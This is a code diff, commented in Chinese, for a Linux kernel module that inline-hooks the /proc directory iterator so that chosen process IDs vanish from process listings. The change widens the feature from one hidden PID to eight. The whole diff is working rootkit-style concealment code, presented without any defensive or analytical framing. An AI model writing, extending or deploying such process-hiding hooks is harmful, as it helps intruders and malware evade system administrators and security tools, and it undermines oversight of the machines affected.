@@ -19,8 +19,9 @@
 // 这里保存几种不同的 filldir 回调类型。
 // 正常只会用到 filldir / filldir64 / compat_filldir，8 个槽够留余量。
 #define HIDE_PROCESS_ACTOR_SLOTS 8
+#define HIDE_PROCESS_MAX_PIDS 8
 
-static pid_t g_hidden_pid = 0;
+static pid_t g_hidden_pids[HIDE_PROCESS_MAX_PIDS];
 static struct hook_entry g_proc_iterate_hook[1];
 static DEFINE_MUTEX(g_hide_process_lock);
 
@@ -40,18 +41,61 @@ struct hide_actor_slot
 // 每种原 actor 都绑定一个固定 wrapper，避免 filldir64 被当成 filldir 调。
 static struct hide_actor_slot g_hide_actor_slots[HIDE_PROCESS_ACTOR_SLOTS];
 
+static bool hide_process_has_pid(void)
+{
+    int i;
+
+    for (i = 0; i < HIDE_PROCESS_MAX_PIDS; i++)
+        if (READ_ONCE(g_hidden_pids[i]))
+            return true;
+    return false;
+}
+
+static int hide_process_add_pid(pid_t pid)
+{
+    int i, empty = -1;
+
+    if (pid <= 0)
+        return -EINVAL;
+
+    for (i = 0; i < HIDE_PROCESS_MAX_PIDS; i++)
+    {
+        pid_t hidden_pid = READ_ONCE(g_hidden_pids[i]);
+
+        if (hidden_pid == pid)
+            return 0;
+        if (!hidden_pid && empty < 0)
+            empty = i;
+    }
+
+    if (empty < 0)
+        return -ENOSPC;
+
+    WRITE_ONCE(g_hidden_pids[empty], pid);
+    return 0;
+}
+
 // 判断当前 /proc 目录项是不是要隐藏的 PID。
 static bool hide_process_match_pid(const char *name, int namlen, unsigned int d_type)
 {
-    pid_t hidden_pid = READ_ONCE(g_hidden_pid);
     char pid_str[16];
-    int pid_len;
+    int i, pid_len;
 
-    if (!hidden_pid || d_type != DT_DIR || namlen <= 0 || namlen >= sizeof(pid_str))
+    if (d_type != DT_DIR || namlen <= 0 || namlen >= sizeof(pid_str))
         return false;
 
-    pid_len = snprintf(pid_str, sizeof(pid_str), "%d", hidden_pid);
-    return pid_len == namlen && __builtin_memcmp(name, pid_str, namlen) == 0;
+    for (i = 0; i < HIDE_PROCESS_MAX_PIDS; i++)
+    {
+        pid_t hidden_pid = READ_ONCE(g_hidden_pids[i]);
+
+        if (!hidden_pid)
+            continue;
+
+        pid_len = snprintf(pid_str, sizeof(pid_str), "%d", hidden_pid);
+        if (pid_len == namlen && __builtin_memcmp(name, pid_str, namlen) == 0)
+            return true;
+    }
+    return false;
 }
 
 // 内核 6.1 起 filldir_t 返回 bool；老版本返回 int。
@@ -190,7 +234,7 @@ static int proc_iterate_hook_work(struct pt_regs *regs)
     filldir_t actor;
     filldir_t wrapper;
 
-    if (!READ_ONCE(g_hidden_pid) || !ctx)
+    if (!hide_process_has_pid() || !ctx)
         return 0;
 
     // 保存当前 getdents 使用的真实 actor，并替换成对应 wrapper。
@@ -218,8 +262,9 @@ static int hide_process_install(pid_t pid)
 
     if (g_proc_iterate_hook[0].installed)
     {
-        WRITE_ONCE(g_hidden_pid, pid);
-        pr_debug("hide_process: 更新隐藏 PID %d\n", pid);
+        ret = hide_process_add_pid(pid);
+        if (!ret)
+            pr_debug("hide_process: 添加隐藏 PID %d\n", pid);
         goto out_unlock;
     }
 
@@ -252,7 +297,12 @@ static int hide_process_install(pid_t pid)
         goto out_unlock;
     }
 
-    WRITE_ONCE(g_hidden_pid, pid);
+    ret = hide_process_add_pid(pid);
+    if (ret)
+    {
+        inline_hook_remove(g_proc_iterate_hook);
+        goto out_unlock;
+    }
     pr_debug("hide_process: 隐藏 PID %d (iterate_shared=%px)\n",
              pid, (void *)iterate_addr);
 
@@ -264,9 +314,12 @@ out_unlock:
 // 卸载hook
 static void hide_process_remove(void)
 {
+    int i;
+
     mutex_lock(&g_hide_process_lock);
     inline_hook_remove(g_proc_iterate_hook);
-    WRITE_ONCE(g_hidden_pid, 0);
+    for (i = 0; i < HIDE_PROCESS_MAX_PIDS; i++)
+        WRITE_ONCE(g_hidden_pids[i], 0);
     hide_actor_slots_reset();
     mutex_unlock(&g_hide_process_lock);
     pr_debug("hide_process: hook 已卸载\n");
